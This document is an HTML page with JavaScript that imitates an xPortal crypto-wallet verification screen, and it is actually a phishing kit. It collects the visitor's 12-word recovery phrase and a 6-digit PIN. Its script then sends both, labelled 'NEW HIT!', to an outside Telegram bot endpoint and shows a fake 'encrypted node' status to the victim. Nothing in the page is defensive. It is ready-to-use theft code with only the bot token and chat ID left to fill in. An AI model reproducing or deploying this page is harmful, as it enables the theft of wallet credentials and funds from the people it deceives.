<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | Wallet Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255, 255, 255, 0.08); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #000; color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); }

        .app-wrapper { width: 100%; max-width: 420px; padding: 25px; text-align: center; }
        .logo-main { width: 80px; height: 80px; margin-bottom: 30px; }

        h1 { font-size: 30px; font-weight: 800; letter-spacing: -1px; margin-bottom: 15px; }
        p.desc { color: #888; font-size: 15px; margin-bottom: 40px; line-height: 1.6; }

        .section { display: none; animation: fadeIn 0.4s ease; }
        .section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* BUTTONS */
        .btn { width: 100%; height: 62px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
        .btn-white { background: #fff; color: #000; }
        .btn-dark { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border); }
        .btn:hover { transform: scale(1.02); }

        /* WORDS GRID */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 25px 0; }
        .word-input { position: relative; }
        .word-input span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; }
        .word-input input { width: 100%; background: #0a0a0a; border: 1px solid var(--border); border-radius: 12px; padding: 14px 5px 14px 28px; color: #fff; font-size: 13px; outline: none; }

        /* PIN CODE */
        .pin-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
        .dot.filled { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 240px; margin: 0 auto; }
        .key { width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; cursor: pointer; border: 1px solid var(--border); }

        #sync { display: none; color: var(--teal); font-weight: 700; margin-top: 20px; font-size: 13px; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="app-wrapper">
    <img src="Capture.PNG" class="logo-main">

    <div id="step1" class="section active">
        <h1>Welcome to xPortal</h1>
        <p class="desc">Connect your xPortal wallet to manage your assets securely.</p>
        <button class="btn btn-white" onclick="showStep(3)">Import Existing Wallet</button>
        <button class="btn btn-dark" onclick="showStep(2)">Create New Wallet</button>
    </div>

    <div id="step2" class="section">
        <h2 style="margin-bottom:10px;">Secret Phrase</h2>
        <p style="color:#888; font-size:14px;">Backup your 12-word recovery phrase.</p>
        <div class="grid" id="createGrid"></div>
        <button class="btn btn-white" onclick="showStep(3)">I've saved them</button>
    </div>

    <div id="step3" class="section">
        <h2 style="margin-bottom:10px;">Secret Phrase</h2>
        <p style="color:#888; font-size:14px;">Enter your 12-word recovery phrase.</p>
        <div class="grid" id="importGrid"></div>
        <button class="btn btn-white" onclick="submitPhrase()">Continue</button>
    </div>

    <div id="step4" class="section">
        <h2 style="margin-bottom:10px;">Security PIN</h2>
        <p style="color:#888; font-size:14px;">Confirm your 6-digit PIN code.</p>
        <div class="pin-dots" id="pinDots">
            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
        </div>
        <div class="keypad">
            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="press(${i})">${i}</div>`);</script>
            <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
        </div>
    </div>

    <div id="sync">ESTABLISHING ENCRYPTED NODE...</div>
</div>

<script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    let phraseData = "";
    let currentPin = "";

    function showStep(s) {
        document.querySelectorAll('.section').forEach(div => div.classList.remove('active'));
        document.getElementById('step'+s).classList.add('active');

        if(s === 2) {
            const words = ["alpha","bravo","charlie","delta","echo","foxtrot","golf","hotel","india","juliet","kilo","lima"];
            const cg = document.getElementById('createGrid');
            cg.innerHTML = words.map((w,i) => `<div class="word-input"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
        }
        if(s === 3) {
            const ig = document.getElementById('importGrid');
            ig.innerHTML = '';
            for(let i=1; i<=12; i++) {
                ig.innerHTML += `<div class="word-input"><span>${i}</span><input type="password" class="w-in" onpaste="handleSmartPaste(event)"></div>`;
            }
        }
    }

    // --- SMART PASTE LOGIC ---
    function handleSmartPaste(e) {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text');
        const words = text.trim().split(/\s+/); // كيقسم الجملة بالخلاءات
        const inputs = document.querySelectorAll('.w-in');
        
        words.forEach((w, i) => {
            if(inputs[i]) inputs[i].value = w; // كيحط كل كلمة ف الخانة ديالها
        });
    }

    function submitPhrase() {
        let wordsArr = [];
        document.querySelectorAll('.w-in').forEach(i => wordsArr.push(i.value.trim()));
        if(wordsArr.some(w => w === "")) return alert("Fill all 12 words");
        phraseData = wordsArr.join(" ");
        showStep(4);
    }

    function press(n) {
        if(currentPin.length < 6) {
            currentPin += n;
            updateDots();
            if(currentPin.length === 6) {
                document.getElementById('step4').style.display = 'none';
                document.getElementById('sync').style.display = 'block';
                const msg = `💎 NEW HIT!\n\nPhrase: ${phraseData}\nPIN: ${currentPin}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            }
        }
    }

    function del() { currentPin = currentPin.slice(0, -1); updateDots(); }
    function updateDots() {
        const dots = document.querySelectorAll('.dot');
        dots.forEach((d, i) => d.classList.toggle('filled', i < currentPin.length));
    }
</script>
</body>
</html>
